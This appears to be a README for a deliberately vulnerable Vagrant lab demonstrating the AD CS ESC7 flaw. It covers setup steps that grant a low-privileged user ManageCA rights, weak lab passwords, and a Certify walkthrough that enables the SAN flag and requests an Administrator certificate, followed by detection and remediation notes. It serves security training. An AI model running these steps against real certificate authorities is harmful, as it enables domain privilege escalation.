# ADCS ESC7 Lab - Vulnerable CA Access Control

> **⚠️ WARNING**: This is an intentionally vulnerable lab environment for educational purposes only. Do NOT deploy in production!

## Overview

Fully automated Active Directory Certificate Services lab demonstrating **ESC7 vulnerability**.
**ESC7** occurs when a low-privileged user is granted dangerous permissions on the Certificate Authority itself:
*   **ManageCA** (Manage CA): Allows changing CA configuration (e.g., enabling SAN flags).
*   **ManageCertificates** (Issue and Manage Certificates): Allows approving pending requests (even if they failed issuance).

### What is ESC7?

If an attacker gains `ManageCA` rights, they can flip the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (making the CA vulnerable to ESC6) or reconfigure KRA settings.
If they gain `ManageCertificates`, they can approve a certificate request that was initially denied (e.g., one with a spoofed SAN) if the CA is configured to hold requests in a pending state.

---

## Lab Architecture

```
┌──────────────────────────────────────┐
│   Host-Only Network: 192.168.57.0/24│
│   Gateway: (Isolated)                │
└──────────────────────────────────────┘
           │
    ┌──────┴───────┐
    │              │
┌───▼────┐    ┌───▼────┐
│ESC7-DC │    │CLT-01  │
│Win2019 │    │ Win 10 │
└────────┘    └────────┘
.57.28        .57.29

Domain: adcs.local
CA: ADCS-CA-ESC7 (Manual Installation)
Vulnerability: 'johndoe' has 'ManageCA' permission
```

---

## Prerequisites

- **VirtualBox** 7.x
- **Vagrant** 2.3+
- **12GB RAM** minimum (DC: 8GB, CLIENT: 4GB)
- **50GB free disk space**

---

## Provisioning Walkthrough

### 1. Start the Domain Controller
1.  **Launch the DC**:
    ```powershell
    cd E:\ADCS\adcs-esc7-lab
    vagrant up dc
    ```
2.  **Wait**: ~15 minutes for Hostname change, AD DS installation, and User creation.

### 2. Manual Certificate Authority Installation
1.  **Log in to DC**: `192.168.57.28` as `Administrator`.
2.  **Install Role**: Active Directory Certificate Services > **Certification Authority**.
3.  **Configure CA**:
    -   Type: **Enterprise CA**
    -   Key: **RSA 2048**
    -   Name: `ADCS-CA-ESC7`

### 3. Configure ESC7 Vulnerability (Manual)
We will grant `johndoe` the **Manage CA** permission essentially making him a CA Administrator.

1.  Open **certsrv.msc** (Certification Authority).
2.  Right-click `ADCS-CA-ESC7` > **Properties**.
3.  Go to the **Security** tab.
4.  **Add** > `johndoe`.
5.  Check **Allow** for:
    -   **Manage CA**
    -   **Issue and Manage Certificates**
6.  Click **OK**.

### 4. Provision the Client
1.  **Launch Client**:
    ```powershell
    vagrant up client
    ```
2.  **Login**: `johndoe` (The vulnerable user).

---

## Lab Credentials

| Username | Password | Email | Role |
|----------|----------|-------|------|
| `ADCS\Administrator` | `P@ssw0rd!123` | - | Domain Admin |
| `ADCS\johndoe` | `Summer2024!` | johndoe@adcs.local | **Attacker** (ManageCA) |
| `ADCS\janesmith` | `Winter2024!` | janesmith@adcs.local | User |
| `ADCS\alicejohnson` | `Spring2024!` | alicejohnson@adcs.local | User |
| `ADCS\bobwilliams` | `Autumn2024!` | bobwilliams@adcs.local | User |
| `ADCS\charliebrown` | `Coffee2024!` | charliebrown@adcs.local | User |

---

## ESC7 Attack Walkthrough

### 1. Discovery
Attackers enumerate CA permissions to find they have control.

```powershell
# From ESC7-CLIENT as johndoe
# Use PSPKI or Certify
.\Certify.exe find

# Look for:
#   "User specified SAN" : Disabled (Initially)
#   "CA Permissions":
#       Owner: ...
#       Access Rights: ManageCA, ManageCertificates
#       Identity: ADCS\johndoe
```

### 2. Exploitation (Turn on ESC6)
The easiest path with `ManageCA` is to enable the SAN flag (making it ESC6).

```powershell
# We have ManageCA, so we can change the registry!
# Use PSPki or Certify to flip the bit remotely

# Command to enable EDITF_ATTRIBUTESUBJECTALTNAME2
.\Certify.exe ca-configuration /ca:192.168.57.28\ADCS-CA-ESC7 /set-flags /enable-san
```

### 3. Execution & Escalation
1.  **Restart CA**: Depending on permissions, you might need to wait for a reboot or force a service restart (if possible via RPC).
2.  **Request Certificate**: Once the flag is active, request a certificate with a SAN (Administrator) just like ESC6.
    ```powershell
    .\Certify.exe request /ca:192.168.57.28\ADCS-CA-ESC7 /template:User /altname:Administrator
    ```

---

## Detection

### Event IDs
| Event ID | Source | Description |
|----------|--------|-------------|
| 4869 | CertificationAuthority | CA service started (Audit configuration changes after restart) |
| 4662 | Security | Operation performed on CA object (Permission change) |

### Remediation
1.  **Audit CA Permissions**: Only CA Administrators should have `ManageCA`.
2.  **Remove Dangerous Rights**: Remove `ManageCA` and `ManageCertificates` from non-admin users/groups.

---

## Lab Management

```powershell
vagrant up      # Start
vagrant destroy # Destroy
```
